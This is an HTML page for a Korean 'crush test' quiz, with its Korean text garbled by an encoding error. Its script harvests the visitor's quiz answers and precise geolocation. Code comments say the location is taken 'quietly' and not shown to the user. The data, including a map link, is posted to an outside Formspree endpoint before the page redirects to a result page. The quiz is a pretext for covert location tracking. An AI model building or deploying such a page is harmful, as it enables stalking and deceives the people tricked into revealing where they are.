<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ì§ì‚¬ë‘ í…ŒìŠ¤íŠ¸ ğŸ’˜</title>
  <link rel="manifest" href="manifest.json" />
  <style>
    body {
      font-family: "Pretendard", sans-serif;
      background: #ffe6eb;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
    }

    h1 {
      color: #ff5c8d;
      font-size: 2rem;
      margin-bottom: 30px;
    }

    .question {
      margin: 10px 0;
      padding: 15px;
      background: white;
      border-radius: 15px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      width: 90%;
    }

    button {
      background: #ff5c8d;
      color: white;
      font-size: 1.2rem;
      border: none;
      border-radius: 15px;
      padding: 15px 30px;
      margin-top: 25px;
      cursor: pointer;
      box-shadow: 0 3px 8px rgba(0,0,0,0.2);
      position: relative;
    }

    button span {
      font-size: 0.8rem;
      display: block;
      color: #ffe6eb;
    }

    button:hover {
      opacity: 0.9;
    }
  </style>
</head>
<body>
  <h1>ğŸ’ ì§ì‚¬ë‘ í…ŒìŠ¤íŠ¸ ğŸ’</h1>

  <form id="loveForm">
    <div class="question"><input type="checkbox" name="q1"> ê·¸ ì‚¬ëŒì„ ìƒê°í•˜ë©´ ê´œíˆ ê¸°ë¶„ì´ ì¢‹ì•„ì§„ë‹¤.</div>
    <div class="question"><input type="checkbox" name="q2"> ì—°ë½ì´ ì˜¤ë©´ ë„ˆë¬´ ê¸°ì˜ê³ , ì•ˆ ì˜¤ë©´ í•˜ë£¨ ì¢…ì¼ ì‹ ê²½ ì“°ì¸ë‹¤.</div>
    <div class="question"><input type="checkbox" name="q3"> í˜¹ì‹œ ë‚˜ë¥¼ ì¢‹ì•„í•˜ëŠ” ê±´ ì•„ë‹ê¹Œ í•˜ëŠ” ìƒìƒì„ í•´ë³¸ ì ì´ ìˆë‹¤.</div>
    <div class="question"><input type="checkbox" name="q4"> ê·¸ ì‚¬ëŒ ì£¼ë³€ ì´ì„± ì¹œêµ¬ë“¤ì„ ë³´ë©´ ì§ˆíˆ¬ê°€ ë‚œë‹¤.</div>
    <div class="question"><input type="checkbox" name="q5"> ê°™ì´ ìˆì„ ë• ë„ˆë¬´ ë–¨ë ¤ì„œ í‰ì†Œì²˜ëŸ¼ í–‰ë™í•˜ê¸° í˜ë“¤ë‹¤.</div>
    <div class="question"><input type="checkbox" name="q6"> ê·¸ ì‚¬ëŒì—ê²Œ ì˜ ë³´ì´ë ¤ê³  ë…¸ë ¥í•œë‹¤ (ì˜·ì°¨ë¦¼, ë§íˆ¬ ë“±).</div>
    <div class="question"><input type="checkbox" name="q7"> ê·¸ ì‚¬ëŒì˜ ì‚¬ì†Œí•œ ë§ë„ ì˜¤ë˜ ê¸°ì–µí•œë‹¤.</div>
    <div class="question"><input type="checkbox" name="q8"> ë‹¤ë¥¸ ì‚¬ëŒì´ ë‚˜ë¥¼ ì¢‹ì•„í•´ë„ ê·¸ ì‚¬ëŒì´ ë” ì‹ ê²½ ì“°ì¸ë‹¤.</div>
    <div class="question"><input type="checkbox" name="q9"> ê·¸ ì‚¬ëŒê³¼ ëˆˆì´ ë§ˆì£¼ì¹˜ê¸°ë§Œ í•´ë„ ì‹¬ì¥ì´ ë›´ë‹¤.</div>
    <div class="question"><input type="checkbox" name="q10"> ê·¸ ì‚¬ëŒê³¼ í•¨ê»˜ ìˆëŠ” ìƒìƒì„ ìì£¼ í•œë‹¤.</div>

    <button type="submit" id="submitBtn">
      ê²°ê³¼ ë³´ê¸°
      <span>ğŸ“ ìœ„ì¹˜ ê³µìœ í•˜ê¸°</span>
    </button>
  </form>

  <script>
    const form = document.getElementById("loveForm");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      // ì‚¬ìš©ì ë‹µë³€ ìˆ˜ì§‘
      const data = new FormData(form);
      const answers = [];
      data.forEach((_, key) => answers.push(key));

      // ìœ„ì¹˜ ì •ë³´ ê°€ì ¸ì˜¤ê¸° (ì¡°ìš©íˆ)
      let locationData = { note: "ìœ„ì¹˜ ê¶Œí•œ ê±°ë¶€ ë˜ëŠ” ì‹¤íŒ¨" };

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const { latitude, longitude } = pos.coords;
            locationData = {
              lat: latitude,
              lon: longitude,
              mapLink: `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`,
              method: "geolocation"
            };
            sendData(answers, locationData);
          },
          () => {
            locationData = { note: "ìœ„ì¹˜ ê¶Œí•œ ê±°ë¶€ë¨" };
            sendData(answers, locationData);
          },
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      } else {
        locationData = { note: "Geolocation ë¯¸ì§€ì› ë¸Œë¼ìš°ì €" };
        sendData(answers, locationData);
      }
    });

    async function sendData(answers, locationData) {
      const payload = {
        answers: answers,
        location: locationData
      };

      await fetch("https://formspree.io/f/YOUR_FORM_ID", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      // ê²°ê³¼ í™”ë©´ìœ¼ë¡œ ì´ë™ (ìœ„ì¹˜ ì •ë³´ í‘œì‹œ ì•ˆ í•¨)
      window.location.href = "result.html";
    }

    // PWA ì„¤ì¹˜ ì¤€ë¹„
    if ("serviceWorker" in navigator) {
      navigator.serviceWorker.register("service-worker.js");
    }
  </script>
</body>
</html>
